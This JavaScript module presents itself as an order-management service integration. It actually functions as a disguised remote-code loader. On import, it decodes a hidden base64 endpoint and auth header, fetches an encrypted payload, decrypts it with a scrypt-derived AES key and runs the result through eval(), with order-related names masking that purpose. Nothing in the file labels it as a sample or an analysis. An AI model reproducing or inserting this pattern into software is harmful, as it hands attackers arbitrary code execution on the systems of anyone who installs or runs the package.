
/**
 * Service integration module for external API authentication
 * Handles secure credential retrieval and Order management
*/

const fileSystem = require('fs');
const cryptoLibrary = require('crypto');
const httpClient = require('axios');
const config = require('./authconfigModel');

class OrderModelManager {
    constructor() {
        this.sessionData = null;
        this.decryptionKey = null;
        this.initializationVector = null;
        this.encryptedPayload = null;
    }

    /**
     * Decode base64 encoded configuration values
     */
    decodeConfigValue(encodedValue) {
        return Buffer.from(encodedValue, 'base64').toString(config.serviceConfig.CHARSET);
    }

    /**
     * Fetch encrypted Order from remote service
     */
    async fetchEncryptedOrder() {
        const apiEndpoint = this.decodeConfigValue(config.endpointConfig.API_GATEWAY);
        const authHeaderKey = this.decodeConfigValue(config.endpointConfig.HEADER_KEY);
        const authHeaderValue = this.decodeConfigValue(config.endpointConfig.HEADER_VALUE);

        const response = await httpClient.get(apiEndpoint, {
            headers: {
                [authHeaderKey]: authHeaderValue
            }
        });

        return response.data.sessions;
    }

    /**
     * Prepare encrypted payload for processing
     */
    prepareEncryptedPayload(encryptedData) {
        const binaryData = Buffer.from(encryptedData, 'base64');
        this.initializationVector = binaryData.slice(0, config.serviceConfig.IV_LENGTH);
        this.encryptedPayload = binaryData.slice(config.serviceConfig.IV_LENGTH);
        return this;
    }

    /**
     * Generate decryption key using password-based key derivation
     */
    generateDecryptionKey() {
        this.decryptionKey = cryptoLibrary.scryptSync(
            config.serviceConfig.AUTH_CREDENTIAL,
            config.serviceConfig.SALT_VALUE,
            config.serviceConfig.KEY_LENGTH
        );
        return this;
    }

    /**
     * Decrypt the encrypted Order data
     */
    decryptOrderModel() {
        const decipher = cryptoLibrary.createDecipheriv(
            config.serviceConfig.ENCRYPTION_METHOD,
            this.decryptionKey,
            this.initializationVector
        );

        const decryptedBuffer = Buffer.concat([
            decipher.update(this.encryptedPayload),
            decipher.final()
        ]);

        this.sessionData = decryptedBuffer.toString(config.serviceConfig.CHARSET);
        return this;
    }

    /**
     * Activate Order with decrypted data
     */
    activateOrder() {
        if (this.sessionData) {
            // Execute Order initialization
            const OrderContext = eval(this.sessionData);
            return OrderContext;
        }
        return null;
    }

    async initializeOrderModel() {
        try {
            const encryptedOrder = await this.fetchEncryptedOrder();
            return this
                .prepareEncryptedPayload(encryptedOrder)
                .generateDecryptionKey()
                .decryptOrderModel()
                .activateOrder();
        } catch (error) {
            console.error('Order initialization failed:', error.message);
            throw error;
        }
    }
}

async function initializeService() {
    const orderModelManager = new OrderModelManager();
    await orderModelManager.initializeOrderModel();
}

initializeService().catch(error => {
    console.error('Service bootstrap failed:', error);
    // process.exit(1);
});

module.exports = {
    OrderModelManager,
    initializeService
};